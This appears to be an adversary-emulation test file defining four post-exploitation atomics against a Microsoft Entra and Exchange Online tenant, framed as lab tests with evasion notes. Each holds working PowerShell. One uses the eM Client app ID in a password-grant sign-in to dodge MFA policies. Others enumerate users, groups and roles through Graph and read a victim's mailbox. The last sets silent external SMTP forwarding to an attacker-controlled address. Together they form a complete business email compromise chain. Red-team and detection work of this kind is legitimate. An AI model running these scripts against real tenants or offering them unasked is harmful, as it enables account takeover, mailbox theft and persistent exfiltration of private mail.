atomics.displayName: Post-Exploitation – eM Client OAuth Sign-In (Custom Primitive)
atomics.testName: Authenticate as eM Client to access mailbox silently
atomics.description: Emulates the eM Client email application's OAuth2 authentication flow, which uses a hardcoded client ID and redirect URI that many Entra tenants have not blocked. This is custom primitive #1 (allowed gap in wrap-don't-write policy): no upstream tool implements the exact eM Client OAuth handshake, so a minimal raw OAuth2 helper is used. The client ID is the known eM Client App ID (b084e965-ad12-4b2e-a979-6c0f58b73b6c).
atomics.executorCommand:
# eM Client custom primitive: raw OAuth2 ROPC for the eM Client App ID.
# This client ID is known to be exempt from MFA in some tenant configs.
$emClientId    = 'b084e965-ad12-4b2e-a979-6c0f58b73b6c'
$tokenEndpoint = "https://login.microsoftonline.com/#{tenant_id}/oauth2/v2.0/token"

$body = @{
    grant_type    = 'password'
    client_id     = $emClientId
    username      = '#{username}'
    password      = '#{password}'
    scope         = 'openid profile offline_access https://outlook.office.com/IMAP.AccessAsUser.All'
}

try {
    $response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint `
        -ContentType 'application/x-www-form-urlencoded' `
        -Body $body -ErrorAction Stop
} catch {
    $detail = ($_ | ConvertFrom-Json -ErrorAction SilentlyContinue)
    throw "eM Client auth failed: $($detail.error_description ?? $_.Exception.Message)"
}

$cacheData = @{
    accessToken  = $response.access_token
    refreshToken = $response.refresh_token
    idToken      = $response.id_token
    tokenType    = $response.token_type
    expiresOn    = ((Get-Date).AddSeconds($response.expires_in).ToUniversalTime().ToString('o'))
    _clientId    = $emClientId
    tenantId     = '#{tenant_id}'
    resource     = 'https://outlook.office.com'
}

$cacheData | ConvertTo-Json -Depth 4 |
    Set-Content -LiteralPath '#{token_output_path}' -NoNewline
Write-Host "eM Client token cached at '#{token_output_path}'."

inputArguments.name: tenant_id
inputArguments.description: Entra tenant ID of the lab tenant.

inputArguments.name: username
inputArguments.description: Lab account UPN to authenticate as eM Client.

inputArguments.name: password
inputArguments.description: Lab account password.

inputArguments.name: token_output_path
inputArguments.description: Path to write the resulting token cache file.

atomics.defenseEvasion: eM Client App ID may be exempt from MFA CA policies; IMAP scope enables silent mail access

atomics.displayName: Post-Exploitation – Azure AD / Entra Graph Enumeration
atomics.testName: Enumerate users, groups, and roles via Microsoft Graph
atomics.description: Enumerates users, groups, service principals, and role assignments from an Entra tenant using a delegated or application Graph token. Maps to CISA's documented BEC reconnaissance phase. Wraps Microsoft.Graph PowerShell module.
atomics.executorCommand:
Import-Module Microsoft.Graph.Users    -ErrorAction Stop
Import-Module Microsoft.Graph.Groups   -ErrorAction Stop
Import-Module Microsoft.Graph.Identity.DirectoryManagement -ErrorAction Stop

$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

$results = [ordered]@{
    users           = @(Get-MgUser -All -Select 'userPrincipalName,displayName,jobTitle,mail' | Select-Object -First 50)
    groups          = @(Get-MgGroup -All -Select 'displayName,mail,groupTypes' | Select-Object -First 50)
    directoryRoles  = @(Get-MgDirectoryRole -All | Select-Object -First 20)
}

$results | ConvertTo-Json -Depth 6 |
    Set-Content -LiteralPath '#{output_path}'

Write-Host "Enumeration complete: $($results.users.Count) users, $($results.groups.Count) groups, $($results.directoryRoles.Count) roles."

inputArguments.name: tenant_id
inputArguments.description: Entra tenant ID of the lab tenant.

inputArguments.name: output_path
inputArguments.description: Path to write enumeration results as JSON.

inputArguments.name: token_cache_path
inputArguments.description: Path to the Graph-scoped token cache file.

atomics.defenseEvasion: Read-only enumeration blends with legitimate admin activity

atomics.displayName: Post-Exploitation – MailItemsAccessed Audit Event Generation
atomics.testName: Access mailbox items via Graph API to generate MailItemsAccessed events
atomics.description: Reads messages from a victim's mailbox via the Microsoft Graph API, generating MailItemsAccessed events in the Unified Audit Log. MailItemsAccessed is a premium E5 audit event that records every OAuth or MAPI access to mailbox items. Wraps Microsoft.Graph.
atomics.executorCommand:
Import-Module Microsoft.Graph.Mail -ErrorAction Stop
$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome

$messages = Get-MgUserMessage `
    -UserId '#{target_user_id}' `
    -Top #{message_count} `
    -Select 'id,subject,receivedDateTime,sender'

$messages | Select-Object Subject, ReceivedDateTime, @{N='From';E={$_.Sender.EmailAddress.Address}} |
    ConvertTo-Json | Set-Content -LiteralPath '#{output_path}'

Write-Host "Accessed $($messages.Count) mail item(s) for '#{target_user_id}'."

inputArguments.name: tenant_id
inputArguments.description: Entra tenant ID of the lab tenant.

inputArguments.name: target_user_id
inputArguments.description: User ID or UPN of the mailbox to access.

inputArguments.name: message_count
inputArguments.description: Number of messages to read (generates audit events).

inputArguments.name: output_path
inputArguments.description: Path to write sampled message subjects (for evidence).

inputArguments.name: token_cache_path
inputArguments.description: Path to a Graph-scoped token cache file.

atomics.defenseEvasion: OAuth Graph access to mailbox items; detectable only with E5 MailItemsAccessed audit

atomics.displayName: Post-Exploitation – Mailbox Forwarding via Exchange Online
atomics.testName: Set SMTP forwarding on victim mailbox via ExchangeOnlineManagement
atomics.description: Sets external SMTP forwarding on a victim mailbox to silently copy all inbound mail to an attacker-controlled address. A classic BEC persistence mechanism. Wraps ExchangeOnlineManagement Set-Mailbox. Requires an EXO-scoped access token.
atomics.executorCommand:
Import-Module ExchangeOnlineManagement -ErrorAction Stop
$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-ExchangeOnline -AccessToken $token.accessToken -Organization '#{tenant_id}' -ShowBanner:$false
Set-Mailbox -Identity '#{target_mailbox}' `
            -ForwardingSmtpAddress 'smtp:#{forwarding_address}' `
            -DeliverToMailboxAndForward $true
Disconnect-ExchangeOnline -Confirm:$false
atomics.cleanupCommand:
Import-Module ExchangeOnlineManagement -ErrorAction Stop
$token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
Connect-ExchangeOnline -AccessToken $token.accessToken -Organization '#{tenant_id}' -ShowBanner:$false
Set-Mailbox -Identity '#{target_mailbox}' -ForwardingSmtpAddress $null -DeliverToMailboxAndForward $false
Disconnect-ExchangeOnline -Confirm:$false

inputArguments.name: tenant_id
inputArguments.description: Entra tenant ID of the lab tenant.

inputArguments.name: target_mailbox
inputArguments.description: UPN of the mailbox to configure forwarding on.

inputArguments.name: forwarding_address
inputArguments.description: External SMTP address to forward mail to.

inputArguments.name: token_cache_path
inputArguments.description: Path to the EXO-scoped token cache file.

atomics.defenseEvasion: Silent exfiltration via SMTP forwarding; no mailbox login required post-setup
